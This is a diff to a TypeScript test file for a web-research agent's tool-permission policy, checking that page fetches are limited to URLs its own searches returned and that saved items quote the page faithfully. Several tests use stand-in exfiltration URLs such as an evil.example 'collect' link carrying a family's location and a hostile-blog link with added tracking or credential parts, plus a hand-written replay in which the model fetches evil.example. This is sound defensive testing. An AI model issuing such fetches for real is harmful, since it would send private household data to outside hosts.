@@ -5,7 +5,10 @@ import { join } from 'node:path';
 import { afterAll, afterEach, describe, expect, it, vi } from 'vitest';
 import { JOBS } from '../../src/jobs/registry';
 import { pollOnce } from '../../src/runner';
-import { decideToolUse, toolCaps } from '../../src/sdk/path-policy';
+import { canonicalizer, inputHash } from '../../src/replay/canonicalize';
+import { writeRecording } from '../../src/replay/store';
+import { decideToolUse, rememberSearchHits, toolCaps } from '../../src/sdk/path-policy';
+import { canonicalInput, replaySession } from '../../src/sdk/session';
 import { fakeDb } from '../../src/test/fake-db';
 import { NumberGuardError } from '../../src/tools/create-item';
 import { listPropertiesTool } from '../../src/tools/list-properties';
@@ -18,11 +21,12 @@ import { RESEARCH_HOUSEHOLD, researchTables, scanRequest, withTitleCheck } from 
 type Row = Record<string, unknown>;
 
 const jobsDir = mkdtempSync(join(tmpdir(), 'esta-research-jobs-'));
+const jobDir = jobsDir;
 afterAll(() => rmSync(jobsDir, { recursive: true, force: true }));
 afterEach(() => vi.restoreAllMocks());
 
 const PAGE = 'https://tintuc.example.vn/vanh-dai-3';
-const PAGE_TEXT = 'Bài Demo đăng ngày 05/10/2026: Vành đai 3 đoạn qua Dĩ An sẽ khởi công tháng 12/2026.';
+const PAGE_TEXT = 'Bài Demo đăng ngày 05/10/2026: Vành đai 3 đoạn qua Dĩ An sẽ khởi công tháng 12/2026, theo quy định có hiệu lực từ 15/11/2026.';
 
 const item = (patch: Row = {}): Row => ({
   source_url: PAGE,
@@ -68,7 +72,7 @@ describe('the web caps in the PreToolUse policy (AGENT.md §5.2)', () => {
     const worker = replayWorker(fakeDb(tables), tables.agent_jobs ?? [], jobsDir, clockOn('2026-10-07T06:00:00+07:00'));
     const prepare = (agent: Row) => {
       tables.household_settings = [{ household_id: RESEARCH_HOUSEHOLD, agent }];
-      return JOBS.research_scan.handler.prepare({ db: worker.db, job: { household_id: RESEARCH_HOUSEHOLD, id: 'job-1' } as never, jobDir: jobsDir, timezone: 'Asia/Ho_Chi_Minh', waiting: [], clock: worker.clock });
+      return JOBS.research_scan.handler.prepare({ db: worker.db, job: { household_id: RESEARCH_HOUSEHOLD, id: 'job-1' } as never, jobDir: jobsDir, timezone: 'Asia/Ho_Chi_Minh', waiting: [], failed: [], clock: worker.clock });
     };
     expect((await prepare({})).caps).toEqual({ WebSearch: 12, WebFetch: 8 });
     expect((await prepare({ research_searches: 4, research_fetches: 2 })).caps).toEqual({ WebSearch: 4, WebFetch: 2 });
@@ -119,13 +123,81 @@ describe('add_research_item', () => {
   });
 
   it('gives each item its own repair turn, and fails on a second violation of the same item with one operator note', async () => {
-    const { call, tables, items } = await scan({ pages: { [PAGE]: PAGE_TEXT, 'https://example.vn/b': 'Bài Demo khác.' } });
+    const { call, tables, items } = await scan({ pages: { [PAGE]: PAGE_TEXT, 'https://example.vn/b': 'Bài Demo khác, đăng ngày 05/10/2026.' } });
     expect((await call('add_research_item', item({ title_vi: 'Vành đai 3 qua Dĩ An' }))).isError).toBe(true);
     expect((await call('add_research_item', item({ source_url: 'https://example.vn/b', quotes: [], title_vi: 'Tin mới hai', summary_vi: 'Tin.' }))).isError, 'the other item has its own repair').toBe(true);
     expect(await call('add_research_item', item())).toEqual({ text: '{"saved":true}', isError: false });
     await expect(call('add_research_item', item({ source_url: 'https://example.vn/b', quotes: [], title_vi: 'Vẫn hai', summary_vi: 'Tin.' }))).rejects.toThrow(NumberGuardError);
     expect(items()).toHaveLength(1);
     expect(tables.agent_items).toMatchObject([{ kind: 'system', audience: 'operator', dedupe_key: 'number_guard:job-scan' }]);
+  });
+});
+
+describe('what the model types is checked before Mẹ reads it (#323)', () => {
+  const searchResult = (...urls: string[]) => ({ query: 'q', results: [{ tool_use_id: 't', content: urls.map((url) => ({ title: 'Demo', url })) }, 'commentary'], durationSeconds: 1 });
+
+  const denied = { allow: false, reason: "WebFetch may open only a page this run's WebSearch returned, with its link as the search gave it" };
+
+  it('lets WebFetch open only a page this run’s WebSearch returned, folding only host case, www, port 443, a trailing slash and the fragment', () => {
+    const policy = { allowed: new Set(['WebSearch', 'WebFetch']), jobDir: '/jobs/x', fetchable: new Set<string>() };
+    rememberSearchHits(policy, 'WebSearch', searchResult(`${PAGE}?id=7`));
+    for (const url of [`${PAGE}?id=7`, 'https://WWW.tintuc.example.vn:443/vanh-dai-3/?id=7#top']) expect(decideToolUse(policy, 'WebFetch', { url }), url).toEqual({ allow: true });
+    expect(decideToolUse(policy, 'WebFetch', { url: 'https://evil.example/?q=Dãy trọ Dĩ An' })).toEqual(denied);
+  });
+
+  it('refuses a search hit’s link with anything added that could carry the family’s data to its host', () => {
+    const policy = { allowed: new Set(['WebSearch', 'WebFetch']), jobDir: '/jobs/x', fetchable: new Set<string>() };
+    const hit = 'https://hostile-blog.vn/tin-vanh-dai-3';
+    rememberSearchHits(policy, 'WebSearch', searchResult(hit));
+    for (const url of [`${hit}?utm_content=Day%20tro%20Di%20An`, `${hit}?ref=DiAn`, `${hit}?share=DiAn`, `${hit}?fbclid=DiAn`, `${hit}?id=7`, 'https://leak:x@hostile-blog.vn/tin-vanh-dai-3', `${hit}/phong-5`]) {
+      expect(decideToolUse(policy, 'WebFetch', { url }), url).toEqual(denied);
+    }
+  });
+
+  it('books a replayed fetch of a page no search returned as denied, and the page never reaches the job', async () => {
+    const prepared = scanRequest(fakeDb(researchTables()));
+    const seen: string[] = [];
+    const request = { spec: JOBS.research_scan, prompt: prepared.prompt, jobDir, configDir: jobDir, tools: prepared.tools, canon: canonicalizer({ householdName: 'Gia đình Demo' }), observe: ({ input }: { input: Record<string, unknown> }) => seen.push(String(input.url ?? input.query)) };
+    const input = canonicalInput(request);
+    const fetch = (url: string) => ({ name: 'WebFetch', input: { url, prompt: 'x' }, result: { code: 200, codeText: 'OK', result: PAGE_TEXT, url, bytes: 1, durationMs: 1 } });
+    writeRecording(jobsDir, { version: 1, kind: input.kind, inputHash: inputHash(input), input, model: 'hand-written', numTurns: 4, toolCalls: [{ name: 'WebSearch', input: { query: 'q' }, result: searchResult(PAGE) }, fetch('https://evil.example/collect?q=Dĩ An'), fetch(PAGE)], reply: 'xong' });
+    vi.spyOn(console, 'log').mockImplementation(() => undefined);
+    vi.spyOn(console, 'warn').mockImplementation(() => undefined);
+    const run = await replaySession(request, jobsDir);
+    expect(run.result.permissionDenials).toEqual([{ tool_name: 'WebFetch', tool_use_id: 'replay-2', tool_input: { url: 'https://evil.example/collect?q=Dĩ An', prompt: 'x' } }]);
+    expect(seen).toEqual(['q', PAGE]);
+  });
+
+  it('runs source_name through the number guard, with the page host for a name that holds a digit', async () => {
+    const { call, items } = await scan();
+    const typed = await call('add_research_item', item({ source_name: 'Báo 24h Demo' }));
+    expect(typed.isError).toBe(true);
+    expect(typed.text).toMatch(/"24[^"]*": .*Fix these and call add_research_item again/s);
+    expect(await call('add_research_item', item({ source_name: '{{f0.host_label}}' }))).toEqual({ text: '{"saved":true}', isError: false });
+    expect(items()).toMatchObject([{ source_name: 'tintuc.example.vn' }]);
+  });
+
+  it('drops an item whose publication date the page does not show, and stores an effective date the page does not show as null', async () => {
+    const { call, items, prepared } = await scan();
+    expect(JSON.parse((await call('add_research_item', item({ published_on: '2026-10-06' }))).text)).toMatchObject({ saved: false, dropped: 'date_unconfirmed' });
+    expect(await call('add_research_item', item({ effective_on: '2026-12-01' }))).toEqual({ text: '{"saved":true}', isError: false });
+    expect(items()).toMatchObject([{ published_on: '2026-10-05', effective_on: null }]);
+    expect(await prepared.finish({ reply: 'xong', model: 'm' })).toMatchObject({ dropped: [{ source_url: PAGE, reason: 'date_unconfirmed' }] });
+  });
+
+  it('refuses a quote under three words, a lone figure, and a figure that matches only inside a longer number', async () => {
+    const { call, items } = await scan();
+    expect((await call('add_research_item', item({ quotes: ['3'] }))).text).toMatch(/"3": a figure is quoted with the words around it, at least 3 words/);
+    expect((await call('add_research_item', item({ quotes: ['tháng 12/2026'] }))).text).toMatch(/at least 3 words/);
+    expect((await call('add_research_item', item({ quotes: ['khởi công tháng 12/202'] }))).text).toMatch(/not on the page WebFetch returned as whole words/);
+    expect(items()).toEqual([]);
+  });
+
+  it('stores the normalized link of the page it fetched, not the link the model typed', async () => {
+    const typed = 'https://www.tintuc.example.vn/vanh-dai-3/?utm_source=zalo#top';
+    const { call, items } = await scan({ pages: { [typed]: PAGE_TEXT } });
+    expect(await call('add_research_item', item({ source_url: typed }))).toEqual({ text: '{"saved":true}', isError: false });
+    expect(items()).toMatchObject([{ source_url: PAGE, url_normalized: PAGE }]);
   });
 });
 
